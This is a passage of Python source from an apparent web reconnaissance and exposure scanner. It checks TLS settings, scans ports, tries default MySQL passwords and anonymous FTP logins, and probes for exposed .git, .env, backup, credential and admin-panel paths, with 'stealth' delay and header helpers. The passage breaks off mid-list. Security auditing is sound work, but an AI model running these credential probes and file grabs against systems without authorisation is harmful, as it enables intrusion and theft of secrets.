                    leaf_crypto = getattr(chain[0], "as_crypto", None)

                    # 30-day expiry + weak signature via cryptography lib
                    _check_cert_obj_tls(domain, leaf_crypto)

                    # Hostname mismatch
                    if getattr(deployment, "leaf_certificate_subject_matches_hostname",
                               None) is False:
                        alert(
                            "TLS CERTIFICATE HOSTNAME MISMATCH",
                            "HIGH",
                            domain,
                            f"Certificate CN/SAN does not match hostname '{host}'",
                        )

                    # Certificate Transparency
                    _check_cert_ct(domain, leaf_crypto)

            # ── HSTS validation ───────────────────────────────────────────
            http_hdrs = getattr(sr, "http_headers", None)
            if http_hdrs:
                hsts_hdr = getattr(http_hdrs, "strict_transport_security_header", None)
                _check_hsts_header(
                    domain,
                    hsts_hdr.header_value if hsts_hdr else None,
                )

    except Exception as e:
        print_error(f"sslyze TLS scan failed for {domain}: {e}")
        # Fall back to ssl-module checks on sslyze error
        _check_tls_ssl_module(host, port, domain)


def _check_tls_ssl_module(host: str, port: int, domain: str) -> None:
    """Fallback TLS analysis using Python's ssl module only."""
    # Legacy protocol versions
    for tls_attr, severity, label, detail in _LEGACY_TLS_VERSIONS:
        if _test_legacy_tls_version(host, port, tls_attr):
            alert(
                f"DEPRECATED TLS PROTOCOL: {label}",
                severity,
                domain,
                detail,
            )

    # Negotiated cipher — check what the server picks by default
    cipher_name = _get_negotiated_cipher(host, port)
    if cipher_name:
        for pattern, sev, label in _WEAK_CIPHER_PATTERNS:
            if pattern in cipher_name.upper():
                alert(
                    f"WEAK CIPHER SUITE: {pattern}",
                    sev,
                    domain,
                    f"Server negotiated weak cipher {cipher_name!r} ({label})",
                )

    # Certificate: hostname match + 30-day expiry via ssl.CertificateError
    from datetime import timezone
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = True
        ctx.verify_mode    = ssl.CERT_REQUIRED
        with socket.create_connection((host, port), timeout=10) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                cert      = ssock.getpeercert()
                not_after = cert.get("notAfter", "")
                if not_after:
                    try:
                        exp   = datetime.strptime(
                            not_after, "%b %d %H:%M:%S %Y %Z").replace(tzinfo=timezone.utc)
                        days  = (exp - datetime.now(timezone.utc)).days
                        if 0 < days <= _CERT_EXPIRY_WARN_DAYS:
                            alert(
                                "TLS CERTIFICATE EXPIRING SOON",
                                "LOW",
                                domain,
                                f"Certificate expires in {days} day(s) ({not_after})",
                            )
                    except Exception:
                        pass
                if _CRYPTO_AVAILABLE:
                    raw = ssock.getpeercert(binary_form=True)
                    cert_obj = _x509.load_der_x509_certificate(raw, _crypto_backend())
                    _check_cert_ct(domain, cert_obj)
    except ssl.CertificateError as e:
        alert(
            "TLS CERTIFICATE HOSTNAME MISMATCH",
            "HIGH",
            domain,
            f"Certificate CN/SAN does not match '{host}': {e}",
        )
    except Exception:
        pass

    # HSTS validation
    resp = safe_get(f"https://{host}", timeout=10, method="head")
    if resp:
        _check_hsts_header(domain, resp.headers.get("Strict-Transport-Security"))


def check_tls_config(domain: str) -> None:
    """
    Entry point for TLS misconfiguration detection.

    Accepts a bare hostname (as supplied by enrich_domain via clean_domain).
    Silently returns if port 443 is not reachable (HTTP-only host).
    Passive check — does not require --active-probes.
    Deduplicates per host.

    Detects:
      - Deprecated protocol versions (SSL 2.0, SSL 3.0, TLS 1.0, TLS 1.1)
      - Weak cipher suites (NULL, EXPORT, RC4, DES/3DES, aNULL, MD5)
      - Certificate issues (hostname mismatch, 30-day expiry, weak sig, no CT)
      - HSTS misconfigurations (short max-age, missing includeSubDomains/preload)
    Uses sslyze when available, falls back to Python's ssl module.
    """
    if domain in _tls_checked:
        return
    _tls_checked.add(domain)

    host = domain
    port = 443

    # Quick reachability probe — silently skip HTTP-only or unreachable hosts
    try:
        with socket.create_connection((host, port), timeout=5):
            pass
    except (ConnectionRefusedError, socket.timeout, OSError):
        return

    print(timestamp() + f" TLS config analysis: {host}:{port}"
          + (" [sslyze]" if _SSLYZE_AVAILABLE else " [ssl module]"))

    if _SSLYZE_AVAILABLE:
        _check_tls_sslyze(host, port, domain)
    else:
        _check_tls_ssl_module(host, port, domain)

# ─────────────────────────────────────────────
# WHOIS — threaded with hard timeout
# ─────────────────────────────────────────────

def get_whois_info(domain):
    result = [None]

    def _do():
        try:
            result[0] = whois.whois(domain)
        except Exception as e:
            print_error("WHOIS failed for " + domain + ": " + str(e))

    t = threading.Thread(target=_do, daemon=True)
    t.start()
    t.join(timeout=10)

    if t.is_alive():
        print_error("WHOIS timeout for " + domain)
        return

    w = result[0]
    if not w:
        return

    try:
        registrar       = w.registrar or 'Unknown'
        creation_date   = w.creation_date
        expiration_date = w.expiration_date
        if isinstance(creation_date, list):
            creation_date = creation_date[0]
        if isinstance(expiration_date, list):
            expiration_date = expiration_date[0]
        creation_str   = str(creation_date)   if creation_date   else 'Unknown'
        expiration_str = str(expiration_date) if expiration_date else 'Unknown'
        print(timestamp() + " WHOIS " + domain + " registrar=" + str(registrar))
        write_to_whois_database(domain, str(registrar), creation_str, expiration_str)
    except Exception as e:
        print_error("WHOIS parse failed for " + domain + ": " + str(e))

# ─────────────────────────────────────────────
# Port scanning
# ─────────────────────────────────────────────

def check_ftp_anonymous(host):
    """
    Attempt an anonymous FTP login. Returns True if the server accepts it.
    This is the only condition under which FTP gets a HIGH alert.
    """
    import ftplib
    try:
        ftp = ftplib.FTP(timeout=5)
        ftp.connect(host, 21)
        ftp.login("anonymous", "anonymous@example.com")
        ftp.quit()
        return True
    except ftplib.error_perm:
        return False   # auth rejected — normal
    except Exception:
        return False

# Default credentials to probe on MySQL — ordered by likelihood
MYSQL_DEFAULT_CREDS = [
    ("root",  ""),
    ("root",  "root"),
    ("root",  "password"),
    ("root",  "mysql"),
    ("mysql", "mysql"),
    ("admin", "admin"),
]

def check_mysql_auth(host):
    """
    Grab the MySQL banner for version recon, then (if pymysql is available)
    attempt a series of default/blank credentials.

    Returns a dict:
      {
        "version":      str | None,   # e.g. "8.0.32"
        "eol":          bool,         # True if major version is 5 or below
        "weak_creds":   (user, pass) | None,  # first working cred pair
        "banner_only":  bool,         # True if pymysql unavailable
      }
    """
    result = {"version": None, "eol": False, "weak_creds": None, "banner_only": False}

    # ── Banner grab (no library needed) ──────────────────────────
    try:
        s = socket.create_connection((host, 3306), timeout=5)
        banner = s.recv(1024)
        s.close()
        if banner and len(banner) > 5:
            # MySQL greeting: [4-byte packet header][1-byte protocol][version\x00...]
            try:
                version_raw = banner[5:].split(b'\x00')[0].decode('utf-8', errors='ignore')
                # Sanity-check it looks like a version string
                if version_raw and version_raw[0].isdigit():
                    result["version"] = version_raw
                    major = version_raw.split('.')[0]
                    if major.isdigit() and int(major) <= 5:
                        result["eol"] = True
            except Exception:
                pass
    except Exception:
        return result  # port open but banner grab failed — nothing more to do

    if not PYMYSQL_AVAILABLE:
        result["banner_only"] = True
        return result

    # ── Auth probe (pymysql) ──────────────────────────────────────
    for user, passwd in MYSQL_DEFAULT_CREDS:
        try:
            conn = pymysql.connect(
                host=host, port=3306, user=user, password=passwd,
                connect_timeout=5, read_timeout=5,
            )
            conn.close()
            result["weak_creds"] = (user, passwd)
            break   # stop at first working pair
        except pymysql.err.OperationalError as e:
            code = e.args[0]
            if code in (1045, 1044):
                continue   # access denied — expected, try next
            break           # unexpected error, stop probing
        except Exception:
            break

    return result

_HTTP_PORTS = {80, 443, 8080, 8443, 8008, 8888}

def _http_waf_check(domain, port):
    """
    Fetch the root path on an HTTP port and return the WAF provider name if
    a WAF intercept is detected, or None if the response looks like a real
    application. Only called for ports that speak HTTP.
    """
    scheme = "https" if port in (443, 8443) else "http"
    url = f"{scheme}://{domain}:{port}/"
    try:
        r = _get_session().get(url, headers=create_request_header(),
                         timeout=5, allow_redirects=True, verify=False)
        return _response_waf_provider(r)
    except Exception:
        return None

def port_scan(domain):
    try:
        ip = socket.gethostbyname(domain)
    except socket.gaierror as e:
        print_error("Port scan failed for " + domain + ": " + str(e))
        return

    def _probe_port(port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            open_ = s.connect_ex((ip, port)) == 0
            s.close()

            if not open_:
                return

            print(timestamp() + " Open port " + str(port) + " on " + domain)
            write_to_ports_database(domain, ip, port)

            if port in CRITICAL_PORTS:
                # These services are dangerous just by being exposed
                svc = CRITICAL_PORTS[port]
                severity = "CRITICAL" if port in {6379, 27017, 23} else "HIGH"
                # HTTP-capable ports may be fronted by a WAF — check before alerting
                waf = _http_waf_check(domain, port) if port in _HTTP_PORTS else None
                if waf:
                    alert(
                        f"EXPOSED SERVICE (UNCONFIRMED — {waf} WAF): port {port} ({svc})",
                        "LOW",
                        domain,
                        f"Port {port} ({svc}) appears open on {ip} but responses show {waf} WAF fingerprint — may be a WAF intercept, not a real service"
                    )
                else:
                    alert(
                        f"EXPOSED SERVICE: port {port} ({svc})",
                        severity,
                        domain,
                        f"Port {port} ({svc}) is open on {ip}"
                    )

            elif port == 3306:
                # MySQL — probe before alerting
                print(timestamp() + " MySQL open on " + domain + " — probing version and auth...")
                mysql = check_mysql_auth(domain)

                if mysql["weak_creds"]:
                    user, passwd = mysql["weak_creds"]
                    disp_pass = f'"{passwd}"' if passwd else "(blank)"
                    alert(
                        "MYSQL DEFAULT CREDENTIALS ACCEPTED",
                        "CRITICAL",
                        domain,
                        f"MySQL on {ip} accepted login: user={user} password={disp_pass}"
                        + (f" — version {mysql['version']}" if mysql["version"] else "")
                    )
                elif mysql["eol"]:
                    alert(
                        "EOL MYSQL VERSION EXPOSED",
                        "HIGH",
                        domain,
                        f"MySQL {mysql['version']} on {ip} is end-of-life and may have unpatched CVEs — auth probe found no default creds"
                    )
                elif mysql["version"]:
                    print(timestamp() + f" MySQL {mysql['version']} on {domain} — auth rejected, no default creds found")
                elif mysql["banner_only"]:
                    print(timestamp() + f" MySQL open on {domain} — install pymysql for auth probing")
                else:
                    print(timestamp() + f" MySQL open on {domain} — banner grab failed, port may be filtered")

            elif port == 21:
                # FTP open is informational — only alert if anonymous login works
                print(timestamp() + " FTP open on " + domain + " — probing anonymous login...")
                if check_ftp_anonymous(domain):
                    alert(
                        "ANONYMOUS FTP LOGIN ACCEPTED",
                        "HIGH",
                        domain,
                        f"Port 21 on {ip} accepts anonymous login — files may be readable/writable without credentials"
                    )
                else:
                    print(timestamp() + " FTP anonymous login rejected on " + domain + " — low risk")

            elif port == 22:
                # SSH open is normal — log it, no alert
                print(timestamp() + " SSH open on " + domain + " (informational)")

        except socket.error:
            pass

    from concurrent.futures import ThreadPoolExecutor, as_completed as _as_completed
    with ThreadPoolExecutor(max_workers=len(COMMON_PORTS)) as _ex:
        _futs = [_ex.submit(_probe_port, port) for port in COMMON_PORTS]
        for _f in _as_completed(_futs):
            pass

# ─────────────────────────────────────────────
# HTTP response history
# ─────────────────────────────────────────────

def record_http_response(url, status_code):
    print(timestamp() + " HTTP " + str(status_code) + " " + url)
    write_to_http_history_database(url, status_code)


# ─────────────────────────────────────────────
# ASN / CDN detection
# ─────────────────────────────────────────────

# Cache so each IP is only looked up once per crawl session
_asn_cache = {}

# Known CDN/hosting ASN patterns — checked against org field from ipinfo.io
CDN_PATTERNS = {
    "Akamai":      ["akamai"],
    "Cloudflare":  ["cloudflare"],
    "Fastly":      ["fastly"],
    "CloudFront":  ["amazon", "cloudfront", "aws"],
    "Google CDN":  ["google"],
    "Azure CDN":   ["microsoft", "azure"],
    "Incapsula":   ["imperva", "incapsula"],
    "Sucuri":      ["sucuri"],
    "Stackpath":   ["stackpath", "highwinds"],
    "Limelight":   ["limelight"],
    "Edgio":       ["edgio", "limelight"],
    "CDN77":       ["cdn77", "datacamp"],
    "KeyCDN":      ["keycdn", "proofpoint"],
    "Shared Host": ["godaddy", "bluehost", "hostgator", "siteground",
                    "namecheap", "dreamhost", "hostinger", "ionos",
                    "ovh", "liquid web"],
}

def detect_cdn(org_str):
    """Returns (is_cdn, cdn_name) based on org string from ipinfo."""
    if not org_str:
        return False, None
    org_lower = org_str.lower()
    for cdn_name, patterns in CDN_PATTERNS.items():
        if any(p in org_lower for p in patterns):
            return True, cdn_name
    return False, None

def asn_lookup(ip):
    """
    Look up ASN and org info for an IP via ipinfo.io.
    Returns dict with asn, org, country, is_cdn, cdn_name.
    Results are cached per session to avoid hammering the API.
    """
    if not ip or ip == "Unknown":
        return None
    if ip in _asn_cache:
        return _asn_cache[ip]
    try:
        stealth_delay("ipinfo.io")
        resp = _get_session().get(
            "https://ipinfo.io/" + ip + "/json",
            headers=stealth_headers({"Accept": "application/json"}),
            timeout=5
        )
        if resp.status_code != 200:
            return None
        data = resp.json()
        org     = data.get("org", "")       # e.g. "AS20940 Akamai Technologies, Inc."
        country = data.get("country", "")
        asn     = org.split(" ")[0] if org else ""  # extract "AS20940"
        is_cdn, cdn_name = detect_cdn(org)

        if is_cdn:
            print(timestamp() + " ASN " + ip + " -> " + org + " [CDN: " + cdn_name + "]")
        else:
            print(timestamp() + " ASN " + ip + " -> " + org)

        result = {
            "ip":       ip,
            "asn":      asn,
            "org":      org,
            "country":  country,
            "is_cdn":   is_cdn,
            "cdn_name": cdn_name or "",
        }
        _asn_cache[ip] = result
        write_to_asn_database(ip, asn, org, country, is_cdn, cdn_name or "")
        return result
    except Exception as e:
        print_error("asn_lookup failed for " + ip + ": " + str(e))
        return None

def write_to_asn_database(ip, asn, org, country, is_cdn, cdn_name):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
        create_db(conn, "ASN")
        # Only insert if not already stored
        existing = conn.execute("SELECT ip FROM ASN WHERE ip=? LIMIT 1", (ip,)).fetchone()
        if not existing:
            conn.execute(
                "INSERT INTO ASN (ip,asn,org,country,is_cdn,cdn_name,looked_up) VALUES (?,?,?,?,?,?,?)",
                (ip, asn, org, country, 1 if is_cdn else 0, cdn_name, timestamp()))
    except Exception as e:
        print_error("write_to_asn_database: " + str(e))
    finally:
        conn.close()

# ─────────────────────────────────────────────
# Exposure checks — .git, .env, CORS, directory listing, backup files, SPF/DMARC
# ─────────────────────────────────────────────

# Track checked base URLs so we don't re-probe the same host twice
_exposure_checked = set()

# .env variants worth probing — ordered by likelihood
ENV_PATHS = [
    "/.env",
    "/.env.local",
    "/.env.production",
    "/.env.prod",
    "/.env.staging",
    "/.env.backup",
    "/.env.old",
    "/.env.example",   # sometimes contains real values anyway
    "/config/.env",
    "/app/.env",
]

# Signatures that confirm a real .env file vs. a 200 that's just the homepage
ENV_SIGNATURES = [
    "APP_KEY=", "DB_PASSWORD=", "DB_HOST=", "SECRET_KEY=",
    "AWS_ACCESS_KEY", "API_KEY=", "MAIL_PASSWORD=", "REDIS_PASSWORD=",
    "DATABASE_URL=", "JWT_SECRET=", "STRIPE_SECRET", "TWILIO_",
    "APP_ENV=", "APP_SECRET=", "S3_SECRET",
]

def check_git_exposure(base_url, domain):
    """
    Probe /.git/HEAD — if it returns 200 and looks like a git ref,
    the entire repo may be downloadable.
    """
    try:
        url = base_url.rstrip("/") + "/.git/HEAD"
        resp = safe_get(url, timeout=6)
        if resp and resp.status_code == 200:
            body = resp.text.strip()
            if body.startswith("ref:") or body.startswith("refs/") or len(body) == 40:
                alert(
                    "EXPOSED .GIT DIRECTORY",
                    "CRITICAL",
                    domain,
                    f"/.git/HEAD returned a valid git ref at {url} — source code may be fully downloadable"
                )
                print(timestamp() + " [!!] .git exposed at " + url)
                return True
            else:
                print(timestamp() + " /.git/HEAD returned 200 but content looks wrong — possible false positive on " + domain)
    except Exception as e:
        print_error("check_git_exposure failed for " + domain + ": " + str(e))
    return False

def check_env_exposure(base_url, domain):
    """
    Probe common .env paths. Confirm findings by looking for known .env
    key signatures in the response body — avoids false positives from
    catch-all 200 handlers.
    """
    found = []
    try:
        for path in ENV_PATHS:
            url = base_url.rstrip("/") + path
            resp = safe_get(url, timeout=6)
            if not resp or resp.status_code != 200:
                continue
            body = resp.text
            # Must contain at least one real .env signature to count
            matched_sigs = [sig for sig in ENV_SIGNATURES if sig in body]
            if matched_sigs:
                detail = f"{url} — contains: {', '.join(matched_sigs[:3])}"
                alert(
                    "EXPOSED .ENV FILE",
                    "CRITICAL",
                    domain,
                    detail
                )
                print(timestamp() + " [!!] .env exposed at " + url + " (matched: " + ", ".join(matched_sigs[:3]) + ")")
                found.append(url)
                break  # one confirmed hit is enough — don't hammer the server
    except Exception as e:
        print_error("check_env_exposure failed for " + domain + ": " + str(e))
    return found

# ── Directory listing ──────────────────────────────────────────

# Paths commonly left with directory listing enabled
DIRECTORY_LISTING_PATHS = [
    "/",
    "/uploads/",
    "/upload/",
    "/files/",
    "/backup/",
    "/backups/",
    "/static/",
    "/assets/",
    "/images/",
    "/img/",
    "/media/",
    "/logs/",
    "/tmp/",
    "/temp/",
    "/data/",
    "/admin/",
    "/wp-content/uploads/",
    "/wp-content/backups/",
]

DIRECTORY_LISTING_SIGNATURES = [
    "Index of /",
    "Directory listing for /",
    "Directory of /",
    "<title>Index of",
    "Parent Directory</a>",
    "[To Parent Directory]",
]

def check_directory_listing(base_url, domain):
    """
    Probe common paths for open directory listings.
    Confirms by looking for known server-generated index page signatures.
    """
    found = []
    try:
        for path in DIRECTORY_LISTING_PATHS:
            url = base_url.rstrip("/") + path
            resp = safe_get(url, timeout=6)
            if not resp or resp.status_code != 200:
                continue
            body = resp.text
            matched = [sig for sig in DIRECTORY_LISTING_SIGNATURES if sig in body]
            if matched:
                alert(
                    "DIRECTORY LISTING ENABLED",
                    "HIGH",
                    domain,
                    f"Open directory index at {url} — file tree exposed to public"
                )
                print(timestamp() + " [!!] Directory listing at " + url)
                found.append(url)
    except Exception as e:
        print_error("check_directory_listing failed for " + domain + ": " + str(e))
    return found

# ── Backup / config file exposure ─────────────────────────────

BACKUP_PATHS = [
    # WordPress
    "/wp-config.php.bak",
    "/wp-config.php~",
    "/wp-config.php.old",
    "/wp-config.bak",
    # Generic config
    "/.htpasswd",
    "/.htaccess.bak",
    "/config.php.bak",
    "/config.yml",
    "/config.yaml",
    "/config.json",
    "/configuration.php.bak",
    "/settings.py.bak",
    "/settings.php.bak",
    "/database.yml",
    "/database.php.bak",
    "/db.php.bak",
    # Credentials / secrets
    "/credentials.json",
    "/secrets.yml",
    "/secrets.yaml",
    "/.aws/credentials",
    # SQL dumps
    "/backup.sql",
    "/dump.sql",
    "/db.sql",
    "/database.sql",
    "/backup.sql.gz",
    # Archive dumps
    "/backup.zip",
    "/backup.tar.gz",
    "/www.zip",
    "/site.zip",
    "/htdocs.zip",
    # Logs
    "/error.log",
    "/access.log",
    "/debug.log",
    "/app.log",
    "/laravel.log",
    "/storage/logs/laravel.log",
]

# Signatures that confirm a file is the real thing rather than a 200 catch-all
BACKUP_SIGNATURES = {
    "wp-config": ["DB_NAME", "DB_PASSWORD", "DB_HOST", "table_prefix"],
    ".htpasswd": [":$apr1$", ":$2y$", ":{SHA}", ":$1$"],
    "config.yml": ["database:", "password:", "secret_key:", "api_key:"],
    "config.yaml": ["database:", "password:", "secret_key:", "api_key:"],
    "database.yml": ["adapter:", "username:", "password:", "database:"],
    "credentials": ["aws_access_key_id", "aws_secret_access_key"],
    ".sql": ["INSERT INTO", "CREATE TABLE", "DROP TABLE", "-- MySQL dump", "-- PostgreSQL"],
    "secrets": ["password:", "api_key:", "secret:", "token:"],
    "laravel.log": ["local.ERROR", "Stack trace", "production.ERROR"],
    ".log": ["ERROR", "Exception", "Traceback", "Fatal"],
}

def _backup_signatures_for(path):
    """Return the right signature list for a given path."""
    for key, sigs in BACKUP_SIGNATURES.items():
        if key in path:
            return sigs
    return None  # no signature required — 200 is enough (e.g. zip/tar files)

def check_backup_exposure(base_url, domain):
    """
    Probe for exposed backup and config files.
    For text-based files, confirm with content signatures to avoid
    false positives from catch-all 200 handlers.
    Binary archive files (zip, tar.gz) are flagged on 200 + correct Content-Type alone.
    Catch-all redirects (302 to homepage for every path) are detected and skipped.
    """
    found = []
    try:
        # ── Catch-all detection ───────────────────────────────────
        # Fetch the homepage and a guaranteed-nonexistent path.
        # If both return the same content/redirect destination, this server
        # uses a catch-all — backup file 200s cannot be trusted.
        canary = base_url.rstrip("/") + "/nuscrape-canary-" + str(random.randint(100000, 999999)) + ".php.bak"
        canary_resp = safe_get(canary, timeout=6)
        if canary_resp:
            # If a random nonexistent path returns 200 or redirects to homepage, it's a catch-all
            if canary_resp.status_code == 200:
                print(timestamp() + " Catch-all 200 detected on " + domain + " — skipping backup file probe")
                return found
            if canary_resp.status_code in (301, 302, 303, 307, 308):
                canary_location = canary_resp.headers.get("Location", "")
                if canary_location.rstrip("/") in (base_url.rstrip("/"), "/", ""):
                    print(timestamp() + " Catch-all redirect detected on " + domain + " — skipping backup file probe")
                    return found

        for path in BACKUP_PATHS:
            url = base_url.rstrip("/") + path
            resp = safe_get(url, timeout=6)
            if not resp or resp.status_code not in (200, 206):
                continue

            content_type = resp.headers.get("Content-Type", "").lower()

            # Reject HTML responses — real config/backup files are never text/html
            if "text/html" in content_type:
                continue

            # Binary archives — confirm via Content-Type, no body parse needed
            if path.endswith((".zip", ".tar.gz", ".gz")):
                if any(ct in content_type for ct in ["zip", "octet-stream", "gzip", "x-tar"]):
                    alert(
                        "EXPOSED BACKUP ARCHIVE",
                        "CRITICAL",
                        domain,
                        f"Backup archive served at {url} (Content-Type: {content_type})"
                    )
                    print(timestamp() + " [!!] Backup archive at " + url)
                    found.append(url)
                continue

            # Text files — require signature match
            sigs = _backup_signatures_for(path)
            body = resp.text

            if sigs is None:
                # No signatures defined — 200 alone is the signal
                confirmed = True
                matched_sigs = []
            else:
                matched_sigs = [s for s in sigs if s in body]
                confirmed = bool(matched_sigs)

            if confirmed:
                detail = f"{url}"
                if matched_sigs:
                    detail += f" — contains: {', '.join(matched_sigs[:3])}"
                alert(
                    "EXPOSED BACKUP / CONFIG FILE",
                    "CRITICAL",
                    domain,
                    detail
                )
                print(timestamp() + " [!!] Backup/config exposed at " + url)
                found.append(url)

    except Exception as e:
        print_error("check_backup_exposure failed for " + domain + ": " + str(e))
    return found


# ─────────────────────────────────────────────
# Sensitive file exposure
# ─────────────────────────────────────────────

# (path, severity, description)
SENSITIVE_FILES = [
    # Package / dependency manifests — leak dependency tree and versions
    ("/package.json",          "MEDIUM",   "Node.js package manifest — exposes dependency tree, scripts, and version info"),
    ("/package-lock.json",     "MEDIUM",   "Node.js lockfile — full dependency tree with exact versions"),
    ("/composer.json",         "MEDIUM",   "PHP Composer manifest — exposes dependency tree"),
    ("/composer.lock",         "MEDIUM",   "PHP Composer lockfile — full dependency tree with hashes"),
    ("/Gemfile",               "MEDIUM",   "Ruby Gemfile — exposes dependency tree"),
    ("/Gemfile.lock",          "MEDIUM",   "Ruby Gemfile.lock — full dependency tree"),
    ("/requirements.txt",      "MEDIUM",   "Python requirements — exposes dependency versions"),
    ("/yarn.lock",             "MEDIUM",   "Yarn lockfile — full dependency tree"),
    # Infrastructure / container files — leak architecture
    ("/Dockerfile",            "HIGH",     "Dockerfile exposed — reveals build process, base image, and may contain secrets"),
    ("/docker-compose.yml",    "HIGH",     "docker-compose.yml exposed — reveals service architecture and may contain credentials"),
    ("/docker-compose.yaml",   "HIGH",     "docker-compose.yaml exposed — reveals service architecture and may contain credentials"),
    ("/.dockerenv",            "MEDIUM",   ".dockerenv present — confirms containerised deployment"),
    ("/Makefile",              "MEDIUM",   "Makefile exposed — reveals build commands and internal tooling"),
    # Config / credential files
    ("/.npmrc",                "HIGH",     ".npmrc exposed — may contain npm auth tokens or private registry credentials"),
    ("/.pypirc",               "HIGH",     ".pypirc exposed — may contain PyPI credentials"),
    ("/.htpasswd",             "CRITICAL", ".htpasswd exposed — contains hashed HTTP Basic Auth credentials"),
    ("/web.config",            "HIGH",     "web.config exposed — IIS config may contain connection strings and credentials"),
    ("/config.xml",            "MEDIUM",   "config.xml exposed — may reveal application configuration"),
    ("/config.json",           "MEDIUM",   "config.json exposed — may reveal application configuration or credentials"),
    ("/settings.json",         "MEDIUM",   "settings.json exposed — may reveal application configuration"),
    ("/database.yml",          "HIGH",     "database.yml exposed — Rails database config may contain credentials"),
    ("/wp-config.php.bak",     "CRITICAL", "WordPress config backup — likely contains DB credentials"),
    ("/config.php.bak",        "CRITICAL", "PHP config backup — likely contains credentials"),
    # PHP info / debug
    ("/phpinfo.php",           "HIGH",     "phpinfo() exposed — reveals PHP config, loaded modules, env vars, and server paths"),
    ("/info.php",              "HIGH",     "phpinfo() exposed — reveals PHP config, loaded modules, env vars, and server paths"),
    ("/test.php",              "MEDIUM",   "test.php accessible — debug/test script left in production"),
    # macOS / editor artifacts — leak directory structure
    ("/.DS_Store",             "MEDIUM",   ".DS_Store exposed — reveals directory file listing from macOS"),
    ("/.idea/workspace.xml",   "MEDIUM",   "JetBrains IDE workspace exposed — reveals project structure and file paths"),
    ("/.vscode/settings.json", "MEDIUM",   "VS Code settings exposed — may reveal project paths and extensions"),
    # CI/CD and secrets
    ("/.travis.yml",           "MEDIUM",   ".travis.yml exposed — reveals CI pipeline and may contain env var names"),
    ("/.circleci/config.yml",  "MEDIUM",   "CircleCI config exposed — reveals CI pipeline structure"),
    ("/.github/workflows",     "MEDIUM",   "GitHub Actions workflows exposed — reveals CI/CD pipeline"),
    ("/Jenkinsfile",            "MEDIUM",   "Jenkinsfile exposed — reveals CI/CD pipeline and may contain credentials"),
    # Logs
    ("/logs/error.log",        "HIGH",     "Error log exposed — may contain stack traces, internal paths, and credentials"),
    ("/error.log",             "HIGH",     "Error log exposed — may contain stack traces, internal paths, and credentials"),
    ("/access.log",            "MEDIUM",   "Access log exposed — reveals traffic patterns and internal endpoints"),
    ("/debug.log",             "HIGH",     "Debug log exposed — may contain sensitive application internals"),
    ("/storage/logs/laravel.log", "HIGH",  "Laravel log exposed — may contain stack traces and request data"),
]

# Body signatures confirming a real file was served (not a catch-all 200 error page)
SENSITIVE_FILE_SIGNATURES = {
    "/package.json":          ['"name"', '"version"', '"dependencies"'],
    "/package-lock.json":     ['"lockfileVersion"', '"node_modules"'],
    "/composer.json":         ['"require"', '"autoload"'],
    "/composer.lock":         ['"packages"', '"content-hash"'],
    "/Dockerfile":            ["FROM ", "RUN ", "COPY ", "EXPOSE "],
    "/docker-compose.yml":    ["services:", "version:", "image:"],
    "/docker-compose.yaml":   ["services:", "version:", "image:"],
    "/.npmrc":                ["registry=", "//registry", "_authToken"],
    "/.htpasswd":             [":$apr1$", ":$2y$", ":{SHA}"],
    "/phpinfo.php":           ["PHP Version", "phpinfo()", "php.ini"],
    "/info.php":              ["PHP Version", "phpinfo()", "php.ini"],
    "/test.php":              ["PHP Version", "phpinfo()", "php.ini", "<?php", "Test Page"],
    "/.DS_Store":             ["\x00\x00\x00\x01Bud1"],   # binary magic
    "/database.yml":          ["adapter:", "database:", "username:", "password:"],
    "/web.config":            ["<configuration>", "connectionStrings", "<system.web>"],
    "/Gemfile":               ["source ", "gem '"],
    "/Jenkinsfile":           ["pipeline {", "stages {", "agent "],
}

_sensitive_checked = set()

def check_sensitive_files(base_url, domain):
    """
    Probe for sensitive files that are commonly committed to source
    control or left accessible by misconfiguration.

    Uses a canary probe to suppress false positives from catch-all 200
    responses (same technique as backup file detection). Where body
    signatures are defined, confirms the file content before alerting.

    Probes run concurrently via a thread pool to avoid serialising on
    slow/hanging servers (e.g. hosts that read-timeout instead of 404ing).
    """
    if domain in _sensitive_checked:
        return
    _sensitive_checked.add(domain)

    # Canary probe — if a random path returns 200, skip (catch-all server)
    canary = base_url.rstrip("/") + f"/nuscrape-canary-{random.randint(100000,999999)}.json"
    try:
        stealth_delay(domain)
        cr = _get_session().get(canary, headers=create_request_header(),
                          timeout=3, allow_redirects=False)
        if cr and cr.status_code == 200:
            print(timestamp() + f" Sensitive file check skipped (catch-all 200): {domain}")
            return
    except Exception:
        pass

    def _probe(path, severity, description):
        url = base_url.rstrip("/") + path
        try:
            stealth_delay(domain)
            resp = _get_session().get(url, headers=create_request_header(),
                                timeout=3, allow_redirects=False)
            if not resp or resp.status_code not in (200, 206):
                return
            body = resp.text
            sigs = SENSITIVE_FILE_SIGNATURES.get(path)
            if sigs and not any(s in body for s in sigs):
                return
            alert("SENSITIVE FILE EXPOSED", severity, url, description)
            print(timestamp() + f" [!!] Sensitive file exposed [{severity}]: {url}")
        except requests.exceptions.Timeout:
            pass
        except Exception as e:
            print_error(f"check_sensitive_files probe failed for {url}: {e}")

    from concurrent.futures import ThreadPoolExecutor, as_completed
    with ThreadPoolExecutor(max_workers=8) as ex:
        futures = [ex.submit(_probe, path, sev, desc) for path, sev, desc in SENSITIVE_FILES]
        for f in as_completed(futures):
            pass  # errors are handled inside _probe


# ─────────────────────────────────────────────
# Admin panel / API doc / debug console discovery
# ─────────────────────────────────────────────

# (path, severity, description)
# 401/403 → "exists but protected" → reported at one severity step lower
ADMIN_PANEL_PATHS = [
    # Generic admin panels
    ("/admin",                   "HIGH",     "Admin panel returned 200 — may be accessible without authentication"),
    ("/administrator",           "HIGH",     "Administrator panel returned 200"),
    ("/admin/login",             "MEDIUM",   "Admin login page exposed"),
    ("/admin/dashboard",         "HIGH",     "Admin dashboard accessible"),
    ("/manage",                  "HIGH",     "Management panel accessible"),
    ("/management",              "HIGH",     "Management panel accessible"),
    ("/backend",                 "HIGH",     "Backend panel accessible"),
    ("/panel",                   "MEDIUM",   "Panel endpoint accessible"),
    ("/dashboard",               "MEDIUM",   "Dashboard endpoint accessible"),
    ("/cpanel",                  "HIGH",     "cPanel accessible"),
    ("/whm",                     "CRITICAL", "WHM (Web Host Manager) accessible"),
    # CMS-specific
    ("/wp-admin",                "HIGH",     "WordPress admin panel"),
    ("/wp-login.php",            "MEDIUM",   "WordPress login page exposed"),
